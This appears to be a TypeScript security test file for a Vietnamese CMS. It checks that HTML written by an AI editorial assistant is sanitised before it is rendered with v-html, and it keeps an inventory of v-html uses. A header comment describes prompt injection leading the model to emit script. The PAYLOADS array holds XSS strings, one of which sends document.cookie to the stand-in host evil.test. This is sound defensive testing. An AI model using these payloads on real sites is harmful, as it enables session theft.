import assert from 'node:assert/strict'
import { readdirSync, readFileSync } from 'node:fs'
import { join, relative } from 'node:path'
import test, { mock } from 'node:test'

/**
 * Trợ lý biên tập AI (`POST /api/admin/ai/editorial`, action `polish`) trả về
 * `polishedContent` do MODEL viết, và `ArticleAIPanel.vue` hiển thị nó bằng
 * `v-html` rồi ghi thẳng vào TinyMCE. Model đọc nội dung bài — một đoạn
 * prompt-injection trong bài có thể khiến nó trả `<img onerror>`/`<script>`, chạy
 * trong phiên quản trị của người bấm "Rà soát". Cùng quy ước với
 * `security-translation-html.test.ts`: chạy handler thật với model giả, rồi giữ
 * một kiểm kê mọi `v-html` để một chỗ hiển thị đầu ra AI mới không lọt qua.
 */

const EXECUTABLE = /<\s*(script|object|embed|svg|math|style|form|input|button)\b/i
const EVENT_HANDLER = /\son[a-z]+\s*=/i
const DANGEROUS_SCHEME = /(javascript|vbscript|data:text\/html)\s*:/i
const neutralised = (html: string) => !EXECUTABLE.test(html) && !EVENT_HANDLER.test(html) && !DANGEROUS_SCHEME.test(html)

const PAYLOADS = [
  '<p>Bài đã sửa</p><script>fetch("//evil.test/?c="+document.cookie)</script>',
  '<p>Ảnh</p><img src=x onerror="alert(document.domain)">',
  '<a href="javascript:alert(1)">bấm vào đây</a>',
  '<svg onload=alert(1)><script>alert(2)</script></svg>',
]

let modelReply = ''
mock.module('../server/services/ai-gateway', {
  namedExports: {
    callAi: async () => ({ ok: true, text: modelReply, promptTokens: 1, completionTokens: 1, costVnd: '0' }),
  },
})
mock.module('../server/utils/ai-budget', { namedExports: { checkBudget: async () => ({ allowed: true }) } })
mock.module('../server/utils/db', { namedExports: { getDb: () => ({}) } })
mock.module('../server/utils/permissions', { namedExports: { requireResourcePermission: () => {} } })

type Event = { body: unknown, context: Record<string, unknown> }
const globals = globalThis as unknown as Record<string, unknown>
globals.defineEventHandler = (handler: unknown) => handler
globals.readBody = async (event: Event) => event.body

type EditorialResponse = {
  polishedContent: string
  changes: Array<{ original: string, suggested: string, reason: string }>
  rawText: string
  titles: string[]
}
const handler = (await import('../server/api/admin/ai/editorial.post')).default as unknown as (event: Event) => Promise<EditorialResponse>
const polish = () => handler({ body: { action: 'polish', title: 'Tiêu đề', content: '<p>Nội dung bài</p>' }, context: { adminUser: { id: 1 } } })

test('polishedContent written by the model is sanitized before it reaches the client', async () => {
  for (const payload of PAYLOADS) {
    modelReply = JSON.stringify({ summaryNotes: 'ok', changes: [], polishedContent: payload })
    const res = await polish()
    assert.ok(neutralised(res.polishedContent), `leaked: ${payload} -> ${res.polishedContent}`)
  }
})

test('legitimate polished markup survives', async () => {
  modelReply = JSON.stringify({ changes: [], polishedContent: '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong> <a href="https://bocongan.gov.vn">liên kết</a></p>' })
  const res = await polish()
  assert.match(res.polishedContent, /<h2>Tiêu đề<\/h2>/)
  assert.match(res.polishedContent, /<strong>đậm<\/strong>/)
  assert.match(res.polishedContent, /href="https:\/\/bocongan\.gov\.vn"/)
})

test('an unparseable reply (shown as the preview) is sanitized too', async () => {
  modelReply = 'Không phải JSON <img src=x onerror=alert(1)><script>alert(2)</script>'
  const res = await polish()
  assert.ok(neutralised(res.polishedContent), res.polishedContent)
  assert.match(res.polishedContent, /Không phải JSON/)
})

test('a suggested replacement (inserted into the editor) is sanitized; the search key is left as text', async () => {
  modelReply = JSON.stringify({
    changes: [{ original: 'sai chính tả', suggested: 'đúng chính tả<img src=x onerror=alert(1)>', reason: 'chính tả' }],
    polishedContent: '',
  })
  const res = await polish()
  assert.equal(res.changes.length, 1)
  assert.ok(neutralised(res.changes[0]!.suggested), res.changes[0]!.suggested)
  assert.match(res.changes[0]!.suggested, /^đúng chính tả/)
  assert.equal(res.changes[0]!.original, 'sai chính tả')
  assert.equal(res.polishedContent, '', 'with a change list and no body, the client applies the changes one by one')
})

test('the AI panel renders only the sanitized field, never the raw reply', () => {
  const panel = readFileSync(new URL('../app/components/admin/articles/ArticleAIPanel.vue', import.meta.url), 'utf8')
  assert.match(panel, /content:\s*res\.polishedContent \|\| ''/)
  assert.doesNotMatch(panel, /polishedContent \|\| res\.rawText/, 'rawText is unsanitized and must not feed v-html')
  const handlerSource = readFileSync(new URL('../server/api/admin/ai/editorial.post.ts', import.meta.url), 'utf8')
  assert.match(handlerSource, /polishedContent:\s*sanitizeHtml\(/)
})

// ─── Kiểm kê v-html ───────────────────────────────────────────────────────────
//
// Mỗi `v-html` trong `app/` phải có tên ở đây cùng nguồn đã lọc. Thêm một `v-html`
// mới (chẳng hạn hiển thị đầu ra AI) làm test này đỏ cho tới khi ai đó chỉ ra nó
// được lọc ở đâu — đúng lỗ hổng `ArticleAIPanel` từng có.
const V_HTML_INVENTORY: Record<string, string> = {
  'app/components/ChatMessageContent.vue :: block': 'app/utils/markdown.ts — escape toàn bộ trước khi dựng thẻ',
  // Tách khỏi ArticleDetail.vue ở wave3 4.2: `html` là `toc.html` của ArticleDetail.vue
  // (buildToc trên articles.content) — người gọi duy nhất, ghim ở test ngay dưới.
  'app/components/article/ArticleBody.vue :: html': 'nội dung bài, sanitizeHtml lúc ghi và ở endpoint công khai (toc.html của ArticleDetail.vue)',
  'app/components/admin/docs/MermaidDiagram.client.vue :: svg': 'mermaid.render (securityLevel mặc định "strict" — mermaid tự lọc SVG đầu ra)',
  'app/components/admin/articles/ArticleQuickViewModal.vue :: quickViewData.content || \'(Chưa có nội dung)\'': 'articles.content, sanitizeHtml lúc ghi',
  'app/components/blocks/ContentAsideBlock.vue :: bodyHtml': 'sanitizeBlockData lúc ghi và lúc đọc',
  'app/components/blocks/RichTextBlock.vue :: html': 'sanitizeBlockData lúc ghi và lúc đọc',
  'app/pages/admin/login.vue :: captchaSvg': 'SVG captcha do máy chủ sinh, không chứa dữ liệu người dùng',
  'app/pages/in-bai/[slug].vue :: article.content': 'articles.content, sanitizeHtml lúc ghi và ở endpoint công khai',
  'app/components/admin/articles/ArticleAIPanel.vue :: polishedPreview.content': 'đầu ra AI — sanitizeHtml ở server/api/admin/ai/editorial.post.ts (test ở trên)',
  'app/components/blocks/StatsBlock.vue :: formatValue(stat.value)': 'formatValue escape HTML',
}

test('every v-html in app/ is inventoried with its sanitized source', () => {
  const root = new URL('..', import.meta.url).pathname
  const found: string[] = []
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const path = join(dir, entry.name)
      if (entry.isDirectory()) { walk(path); continue }
      if (!entry.name.endsWith('.vue')) continue
      const text = readFileSync(path, 'utf8')
      for (const match of text.matchAll(/v-html="([^"]*)"/g)) found.push(`${relative(root, path)} :: ${match[1]}`)
    }
  }
  walk(join(root, 'app'))
  const unknown = found.filter(key => !(key in V_HTML_INVENTORY))
  assert.deepEqual(unknown, [], 'a new v-html: sanitize its source (sanitizeHtml on write AND read) and add it to V_HTML_INVENTORY')
  const stale = Object.keys(V_HTML_INVENTORY).filter(key => !found.includes(key))
  assert.deepEqual(stale, [], 'an inventoried v-html was removed or renamed — update the inventory')
})

// ─── `ArticleBody` (wave3 4.2): a `v-html` behind a prop, so its callers are the source ──
//
// `components/article/ArticleBody.vue` renders its `html` prop with `v-html`. The inventory
// entry above is true only while its ONE caller hands it the sanitized, id-stamped body. A
// prop is a door into `v-html` for whoever uses the component — and Nuxt auto-imports it
// everywhere as `<ArticleBody>` / `<article-body>` / `<LazyArticleBody>` — so every use is
// pinned: exactly one, in ArticleDetail.vue, binding exactly `:html="toc.html"`.
const ARTICLE_BODY_USE = /<(?:Lazy)?ArticleBody\b[^>]*>|<(?:lazy-)?article-body\b[^>]*>|from\s+['"][^'"]*article\/ArticleBody(?:\.vue)?['"]/g

/**
 * Ways to render ArticleBody WITHOUT writing its tag — none of them allowed anywhere, the one
 * caller included: the tag check below only sees `<ArticleBody …>`, so `<component
 * :is="ArticleBody" :html="article.excerpt">` would hand it unsanitized text unseen.
 *   - a dynamic component bound to it (`:is` / `v-bind:is` / static `is=`, by identifier or name);
 *   - `resolveComponent('ArticleBody')` / `'article-body'` / `'LazyArticleBody'`;
 *   - a dynamic import of its file (what `defineAsyncComponent(() => import(…))` needs);
 *   - Nuxt's `#components` virtual module;
 *   - a render function on the imported component (`h(ArticleBody, …)`, `createVNode(…)`).
 */
const ARTICLE_BODY_INDIRECT = [
  /\bis\s*=\s*(?:"[^"]*\b(?:Lazy)?ArticleBody\b[^"]*"|'[^']*\b(?:Lazy)?ArticleBody\b[^']*')/g,
  /\bis\s*=\s*(?:"[^"]*\b(?:lazy-)?article-body\b[^"]*"|'[^']*\b(?:lazy-)?article-body\b[^']*')/g,
  /resolveComponent\(\s*['"`](?:Lazy)?(?:ArticleBody|article-body|lazy-article-body)['"`]/g,
  /import\(\s*['"`][^'"`]*article\/ArticleBody(?:\.vue)?['"`]\s*\)/g,
  /import\s*\{[^}]*\b(?:Lazy)?ArticleBody\b[^}]*\}\s*from\s*['"]#components['"]/g,
  // The component as a VALUE (handed to `h()`, a variable, an option…): `= ArticleBody`,
  // `(ArticleBody`, `, ArticleBody`, `: ArticleBody`, `{ ArticleBody }` — never just its
  // `import … from` line or its tag.
  /(?:[=(,:?]|\breturn)\s*(?:Lazy)?ArticleBody\b(?!\s*from\b)|\{\s*(?:Lazy)?ArticleBody\s*[,}]/g,
]

/** Comments out (they name ArticleBody to explain it), before the indirect scan. */
const withoutComments = (source: string) => source
  .replace(/<!--[\s\S]*?-->/g, '')
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:])\/\/[^\n]*/g, '$1')

function articleBodyCallerProblems(files: Array<{ file: string, source: string }>): string[] {
  const problems: string[] = []
  let tags = 0
  for (const { file, source } of files) {
    for (const use of source.match(ARTICLE_BODY_USE) ?? []) {
      if (use.startsWith('from')) {
        if (file !== 'app/components/ArticleDetail.vue') problems.push(`${file} imports ArticleBody`)
        continue
      }
      tags += 1
      if (file !== 'app/components/ArticleDetail.vue') problems.push(`${file}: ${use}`)
      else if (!/^<ArticleBody\s+:html="toc\.html"\s*\/>$/.test(use)) problems.push(`${file}: ${use}`)
    }
    const code = withoutComments(source)
    for (const pattern of ARTICLE_BODY_INDIRECT) {
      for (const use of code.match(pattern) ?? []) problems.push(`${file}: ArticleBody used indirectly — ${use}`)
    }
  }
  if (tags !== 1) problems.push(`expected exactly one <ArticleBody>, found ${tags}`)
  return problems
}

function appSources(): Array<{ file: string, source: string }> {
  const root = new URL('..', import.meta.url).pathname
  const out: Array<{ file: string, source: string }> = []
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const path = join(dir, entry.name)
      if (entry.isDirectory()) { walk(path); continue }
      if (/\.(vue|ts)$/.test(entry.name)) out.push({ file: relative(root, path), source: readFileSync(path, 'utf8') })
    }
  }
  walk(join(root, 'app'))
  return out
}

test('ArticleBody is fed only by ArticleDetail, with the sanitized id-stamped body', () => {
  assert.deepEqual(articleBodyCallerProblems(appSources()), [])
})

test('the ArticleBody caller guard bites (injection proof)', () => {
  const files = appSources()
  const parentAt = files.findIndex(f => f.file === 'app/components/ArticleDetail.vue')
  const swapped = files.map((f, i) => (i === parentAt ? { ...f, source: f.source.replace('<ArticleBody :html="toc.html" />', '<ArticleBody :html="article.content" />') } : f))
  assert.equal(articleBodyCallerProblems(swapped).length, 1)
  for (const tag of ['<ArticleBody :html="raw" />', '<article-body :html="toc.html" />', '<LazyArticleBody :html="x" />']) {
    assert.equal(articleBodyCallerProblems([...files, { file: 'app/pages/planted.vue', source: `<template>${tag}</template>` }]).length, 2, tag)
  }
  assert.equal(articleBodyCallerProblems([...files, { file: 'app/components/Planted.vue', source: "import ArticleBody from '~/components/article/ArticleBody.vue'" }]).length, 1)

  // Indirect renders: each one red, in another file AND in ArticleDetail.vue itself (the tag
  // check alone let `<component :is="ArticleBody" :html="article.excerpt">` through).
  const indirect = [
    '<template><component :is="ArticleBody" :html="article.excerpt" /></template>',
    '<template><component v-bind:is="ArticleBody" :html="x" /></template>',
    '<template><component :is="\'LazyArticleBody\'" :html="x" /></template>',
    '<template><component is="article-body" :html="x" /></template>',
    "<script setup>const Body = resolveComponent('ArticleBody')</script>",
    "<script setup>const Body = resolveComponent('article-body')</script>",
    "<script setup>const Body = defineAsyncComponent(() => import('~/components/article/ArticleBody.vue'))</script>",
    "<script setup>import { LazyArticleBody } from '#components'</script>",
    '<script setup>const vnode = h(ArticleBody, { html: raw })</script>',
    '<script setup>const Body = ArticleBody</script><template><component :is="Body" :html="x" /></template>',
    '<script>export default { components: { ArticleBody } }</script>',
  ]
  for (const plant of indirect) {
    assert.ok(articleBodyCallerProblems([...files, { file: 'app/pages/planted.vue', source: plant }]).length >= 1, `another file: ${plant}`)
    const inParent = files.map((f, i) => (i === parentAt ? { ...f, source: `${f.source}\n${plant}` } : f))
    assert.ok(articleBodyCallerProblems(inParent).length >= 1, `ArticleDetail.vue: ${plant}`)
  }
})
